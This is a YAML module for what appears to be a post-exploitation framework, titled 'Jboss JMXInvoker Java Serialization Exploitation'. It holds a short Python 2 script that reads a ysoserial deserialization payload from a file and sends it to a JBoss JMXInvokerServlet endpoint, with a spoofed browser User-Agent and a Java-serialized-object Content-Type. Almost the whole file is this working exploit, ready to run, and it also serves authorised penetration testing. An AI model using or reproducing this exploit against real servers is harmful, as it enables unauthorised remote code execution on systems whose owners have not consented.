name: Jboss JMXInvoker Java Serialization Exploitation
authors:
  - name: ''
    handle: '@424f424f'
    link: https://twitter.com/424f424f
description: Exploit JBoss java serialization flaw. Requires upload of ysoserial payload.
software: ''
tactics: []
techniques:
  - T1210
background: false
output_extension:
needs_admin: false
opsec_safe: false
language: python
min_language_version: '2.6'
comments:
  - Generate Payload with https://github.com/frohoff/ysoserial
options:
  - name: Agent
    description: Agent to execute on.
    required: true
    value: ''
  - name: URL
    description: URL to JMXInvoker
    required: true
    value: http://127.0.0.1:8080/invoker/JMXInvokerServlet
  - name: Payload
    description: Path to ysoserial payload.
    required: true
    value: ''
script: |-
  import urllib2

  # Read payload file into variable
  try:
      with open('{{ Payload }}', 'rb') as f:
          data=f.read()
  except Exception as e:
      print("Failure reading payload: " + str(e))

  url = '{{ URL }}'
  try:
      request = urllib2.Request(url, data)
      request.add_header('User-Agent',
                     'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
                     'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
      request.add_header('Content-Type', 'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue')
      opener = urllib2.build_opener(urllib2.HTTPHandler)
      content = opener.open(request).read()
  except Exception as e:
      print("Failure sending payload: " + str(e))

  print("Finished")
